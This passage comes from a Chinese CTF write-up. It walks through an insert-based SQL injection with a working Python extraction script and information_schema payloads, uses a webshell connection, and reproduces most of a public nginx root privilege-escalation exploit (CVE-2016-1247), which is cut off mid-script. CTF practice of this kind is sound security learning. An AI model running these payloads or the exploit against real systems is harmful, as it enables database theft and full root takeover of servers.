punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token variable\">$e</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'e'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token variable\">$u</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token variable\">$p</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'p'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token string double-quoted-string\">\"insert into test1</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>set email = '<span class=\"token interpolation\"><span class=\"token variable\">$e</span></span>', </pre></td></tr><tr><td data-num=\"21\"></td><td><pre>username = '<span class=\"token interpolation\"><span class=\"token variable\">$u</span></span>',</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>password = '<span class=\"token interpolation\"><span class=\"token variable\">$p</span></span>'</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\"</span><span class=\"token punctuation\">;</span>\t\t\t\t<span class=\"token comment\">// 由代码，此处可以采用 insert 注入</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">check</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$e</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token function\">check</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$u</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token function\">check</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$con</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'location:login.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre> </pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>user.php</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'db.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> \t\t<span class=\"token comment\">// 查询结果需要为数字</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span>\t</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t\t<span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token comment\">// 只会取十位的结果，因此需要不断地查找访问</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Hello <span class=\"token interpolation\"><span class=\"token variable\">$username</span></span>,there's nothing here but dog food!\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;script>alert('The username can only be a number.How did you get here?go out!!!');location.href='login.php';&lt;/script>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;script>alert('Login first!');location.href='login.php';&lt;/script>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>读过代码后，可以确认可以进行 insert 注入</p>\n<p>需要解决的问题</p>\n<ol>\n<li>\n<p>sql 语句为 <code>$sql =&quot;select username from test1 where email='$e' and password='$p'&quot;</code></p>\n<p>而最后显示的是 username，那么可以将 username 变为 sql 查询语句，从而获取登陆成功后的返回值</p>\n</li>\n<li>\n<p>由于代码中 <code>$username='$u'</code> ，所以为了正常，使得 u 以 <code>0'+</code>  开始，'0 结束使得最后的插入的语句为 <code>’0‘+ 查询语句 +'0'</code> , 语句不会发生语法错误</p>\n</li>\n<li>\n<p>由于每次只能显示 10 位，那么需要进行多次查询，第一次查前 10，再查 10~20，直至查完</p>\n</li>\n<li>\n<p>re.findall(pattern, string, flags=0)</p>\n<p>查询 str 里满足 pattern 的匹配的全部字符串</p>\n<p>其中有两种形式</p>\n<p>如果是 Hello (.*), ，那么只会返回括号里的内容</p>\n<p>如果没有括号，会返回整个，而对于我们来说，只需要 username 即可</p>\n</li>\n</ol>\n<p>因此脚本为</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> re</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>url_l <span class=\"token operator\">=</span> <span class=\"token string\">\"http://a8848a6d-ac93-4c3c-aa6e-16af71df7eea.challenge.ctf.show/login.php\"</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>url_r <span class=\"token operator\">=</span> <span class=\"token string\">\"http://a8848a6d-ac93-4c3c-aa6e-16af71df7eea.challenge.ctf.show/register.php\"</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token comment\">#payload = \"'+substr(hex(hex((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()))),(&#123;&#125;-1)*10+1,10)+'\".format(i)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token comment\">#payload = \"0'+substr(hex(hex((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='flag'))),(&#123;&#125;-1)*10+1,10)+'0\".format(i)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token comment\">#payload = \"0'+substr(hex(hex((select/**/*/**/from/**/flag))),(&#123;&#125;-1)*10+1,10)+'0\".format(i)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    emil <span class=\"token operator\">=</span> <span class=\"token string\">\"&#123;&#125;@3\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">print</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    data <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token string\">\"e\"</span><span class=\"token punctuation\">:</span> emil<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token string\">\"u\"</span><span class=\"token punctuation\">:</span> payload<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token string\">\"p\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    data1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token string\">\"e\"</span><span class=\"token punctuation\">:</span> emil<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token string\">\"p\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url_r<span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url_l<span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>data1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    flag <span class=\"token operator\">+=</span> re<span class=\"token punctuation\">.</span>findall<span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello (.*),\"</span><span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>先得到表名， <code>363636433631363732433735373336353732</code></p>\n<p>解码为 <code>flag,user</code></p>\n<p>再得到字段名 <code>3636364336313637</code></p>\n<p>解码为 <code>flag</code></p>\n<p>再查询 <code>flag</code></p>\n<p>得到  <code>363337343636373336383646373737423337333433373334333733383331333932443338333633343333324433343331363336313244363133373330333432443335333033343631333833363634333736313631363336353744</code></p>\n<p>解码为 <code>ctfshow&#123;74747819-8643-41ca-a704-504a86d7aace&#125;</code></p>\n<h2 id=\"出题人不想跟你说话jpg\"><a class=\"anchor\" href=\"#出题人不想跟你说话jpg\">#</a> 出题人不想跟你说话.jpg</h2>\n<p>看到标题及图片中的 &quot;cai&quot;，尝试菜刀连接，密码为 &quot;cai&quot;</p>\n<p>成功连接，查看目录文件，在根目录找到 flag 文件，但权限不足，无法查看，所以这里需要提权</p>\n<p><code>lsb_release -a</code> ，列出所有 linux 系统版本信息<br />\n <code>nginx -v</code> ，列出 nginx 版本信息</p>\n<p>得到</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Ubuntu 14.04.5 LTS</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>nginx&#x2F;1.4.6 (Ubuntu)</pre></td></tr></table></figure><p>这里使用<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VlYnVnLm9yZy92dWxkYi9zc3ZpZC05MjUzOA==\"> Nginx 权限提升漏洞 (CVE-2016-1247)</span></p>\n<p>按照漏洞说明及脚本，编写 <code>nginx.sh</code>  (在 linux 环境下编写，保持行尾符为 LF)，并上传到网站根目录</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL25naW54LnNoLw==\">nginx.sh</span></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token shebang important\">#!/bin/bash</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># Nginx (Debian-based distros) - Root Privilege Escalation PoC Exploit</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># nginxed-root.sh (ver. 1.0)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># CVE-2016-1247</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># Discovered and coded by:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">#</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># Dawid Golunski</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\"># dawid[at]legalhackers.com</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">#</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># https://legalhackers.com</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">#</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\"># Follow https://twitter.com/dawid_golunski for updates on this advisory.</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\">#</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\"># ---</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\"># This PoC exploit allows local attackers on Debian-based systems (Debian, Ubuntu</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\"># etc.) to escalate their privileges from nginx web server user (www-data) to root </span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\"># through unsafe error log handling.</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\">#</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\"># The exploit waits for Nginx server to be restarted or receive a USR1 signal.</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\"># On Debian-based systems the USR1 signal is sent by logrotate (/etc/logrotate.d/nginx)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\"># script which is called daily by the cron.daily on default installations.</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\"># The restart should take place at 6:25am which is when cron.daily executes.</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\"># Attackers can therefore get a root shell automatically in 24h at most without any admin</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># interaction just by letting the exploit run till 6:25am assuming that daily logrotation </span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\"># has been configured. </span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token comment\">#</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\">#</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\"># Exploit usage:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token comment\"># ./nginxed-root.sh path_to_nginx_error.log </span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token comment\">#</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token comment\"># To trigger logrotation for testing the exploit, you can run the following command:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token comment\">#</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token comment\"># /usr/sbin/logrotate -vf /etc/logrotate.d/nginx</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token comment\">#</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token comment\"># See the full advisory for details at:</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token comment\"># https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token comment\">#</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token comment\"># Video PoC:</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token comment\"># https://legalhackers.com/videos/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token comment\">#</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token comment\">#</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token comment\"># Disclaimer:</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token comment\"># For testing purposes only. Do no harm.</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token comment\">#</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token assign-left variable\">BACKDOORSH</span><span class=\"token operator\">=</span><span class=\"token string\">\"/bin/bash\"</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token assign-left variable\">BACKDOORPATH</span><span class=\"token operator\">=</span><span class=\"token string\">\"/tmp/nginxrootsh\"</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token assign-left variable\">PRIVESCLIB</span><span class=\"token operator\">=</span><span class=\"token string\">\"/tmp/privesclib.so\"</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token assign-left variable\">PRIVESCSRC</span><span class=\"token operator\">=</span><span class=\"token string\">\"/tmp/privesclib.c\"</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token assign-left variable\">SUIDBIN</span><span class=\"token operator\">=</span><span class=\"token string\">\"/usr/bin/sudo\"</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-name function\">cleanexit</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    <span class=\"token comment\"># Cleanup </span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    <span class=\"token builtin class-name\">echo</span> <span class=\"token parameter variable\">-e</span> <span class=\"token string\">\"<span class=\"token entity\" title=\"\\n\">\\n</span>[+] Cleaning up...\"</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    <span class=\"token function\">rm</span> <span class=\"token parameter variable\">-f</span> <span class=\"token variable\">$PRIVESCSRC</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    <span class=\"token function\">rm</span> <span class=\"token parameter variable\">-f</span> <span class=\"token variable\">$PRIVESCLIB</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    <span class=\"token function\">rm</span> <span class=\"token parameter variable\">-f</span> <span class=\"token variable\">$ERRORLOG</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    <span class=\"token function\">touch</span> <span class=\"token variable\">$ERRORLOG</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">[</span> <span class=\"token parameter variable\">-f</span> /etc/ld.so.preload <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>        <span class=\"token builtin class-name\">echo</span> <span class=\"token parameter variable\">-n</span> <span class=\"token operator\">></span> /etc/ld.so.preload</pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    <span class=\"token keyword\">fi</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    <span class=\"token builtin class-name\">echo</span> <span class=\"token parameter variable\">-e</span> <span class=\"token string\">\"<span class=\"token entity\" title=\"\\n\">\\n</span>[+] Job done. Exiting with code <span class=\"token variable\">$1</span> <span class=\"token entity\" title=\"\\n\">\\n</span>\"</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    <span class=\"token builtin class-name\">exit</span> <span class=\"token variable\">$1</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-name function\">ctrl_c</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>        <span class=\"token builtin class-name\">echo</span> <span class=\"token parameter variable\">-e</span> <span class=\"token string\">\"<span class=\"token entity\" title=\"\\n\">\\n</span>[+] Ctrl+C pressed\"</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>    cleanexit <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre></pre></td></tr><tr><td data-num=\"74\"></td><td><pre><span class=\"token comment\">#intro </span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre><span class=\"token function\">cat</span> <span class=\"token operator\">&lt;&lt;</span><span class=\"token string\">_eascii_</pre></td></tr><tr><td data-num=\"77\"></td><td><pre> _______________________________</pre></td></tr><tr><td data-num=\"78\"></td><td><pre>&lt; Is your server (N)jinxed ? ;o ></pre></td></tr><tr><td data-num=\"79\"></td><td><pre> -------------------------------</pre></td></tr><tr><td data-num=\"80\"></td><td><pre>           \\ </pre></td></tr><tr><td data-num=\"81\"></td><td><pre>            \\          __---__</pre></td></tr><tr><td data-num=\"82\"></td><td><pre>                    _-       /--______</pre></td></tr><tr><td data-num=\"83\"></td><td><pre>               __--( /     \\ )XXXXXXXXXXX<span class=\"token entity\" title=\"\\v\">\\v</span>.  </pre></td></tr><tr><td data-num=\"84\"></td><td><pre>             .-XXX(   O   O  )XXXXXXXXXXXXXXX- </pre></td></tr><tr><td data-num=\"85\"></td><td><pre>            /XXX(       U     )        XXXXXXX\\ </pre></td></tr><tr><td data-num=\"86\"></td><td><pre>          /XXXXX(              )--_  XXXXXXXXXXX\\ </pre></td></tr><tr><td data-num=\"87\"></td><td><pre>         /XXXXX/ (      O     )   XXXXXX   \\XXXXX\\ </pre></td></tr><tr><td data-num=\"88\"></td><td><pre>         XXXXX/   /            XXXXXX   \\__ \\XXXXX</pre></td></tr><tr><td data-num=\"89\"></td><td><pre>         XXXXXX__/          XXXXXX         \\__----></pre></td></tr><tr><td data-num=\"90\"></td><td><pre> ---___  XXX__/          XXXXXX      \\__         /</pre></td></tr><tr><td data-num=\"91\"></td><td><pre>   \\-  --__/   ___/\\  XXXXXX            /  ___--/=</pre></td></tr><tr><td data-num=\"92\"></td><td><pre>    \\-\\    ___/    XXXXXX              '--- XXXXXX</pre></td></tr><tr><td data-num=\"93\"></td><td><pre>       \\-\\/XXX\\ XXXXXX                      /XXXXX</pre></td></tr><tr><td data-num=\"94\"></td><td><pre>         \\XXXXXXXXX   \\                    /XXXXX/</pre></td></tr><tr><td data-num=\"95\"></td><td><pre>          \\XXXXXX      >                 _/XXXXX/</pre></td></tr><tr><td data-num=\"96\"></td><td><pre>            \\XXXXX--__/              __-- XXXX/</pre></td></tr><tr><td data-num=\"97\"></td><td><pre>             -XXXXXXXX---------------  XXXXXX-</pre></td></tr><tr><td data-num=\"98\"></td><td><pre>                \\XXXXXXXXXXXXXXXXXXXXXXXXXX/</pre></td></tr><tr><td data-num=\"99\"></td><td><pre>                  \"\"VXXXXXXXXXXXXXXXXXXV\"\"</pre></td></tr><tr><td data-num=\"100\"></td><td><pre>_eascii_</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre></pre></td></tr><tr><td data-num=\"102\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token parameter variable\">-e</span> <span class=\"token string\">\"<span class=\"token entity\" title=\"\\033\">\\033</span>[94m <span class=\"token entity\" title=\"\\n\">\\n</span>Nginx (Debian-based distros) - Root Privilege Escalation PoC Exploit (CVE-2016-1247) <span class=\"token entity\" title=\"\\n\">\\n</span>nginxed-root.sh (ver. 1.0)<span class=\"token entity\" title=\"\\n\">\\n</span>\"</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token parameter variable\">-e</span> <span class=\"token string\">\"Discovered and coded by: <span class=\"token entity\" title=\"\\n\">\\n</span><span class=\"token entity\" title=\"\\n\">\\n</span>Dawid Golunski <span class=\"token entity\" title=\"\\n\">\\n</span>https://legalhackers.com <span class=\"token entity\" title=\"\\033\">\\033</span>[0m\"</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre></pre></td></tr><tr><td data-num=\"105\"></td><td><pre><span class=\"token comment\"># Args</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">[</span> <span class=\"token variable\">$#</span> <span class=\"token parameter variable\">-lt</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>    <span class=\"token builtin class-name\">echo</span> <span class=\"token parameter variable\">-e</span> <span class=\"token string\">\"<span class=\"token entity\" title=\"\\n\">\\n</span>[!] Exploit usage: <span class=\"token entity\" title=\"\\n\">\\n</span><span class=\"token 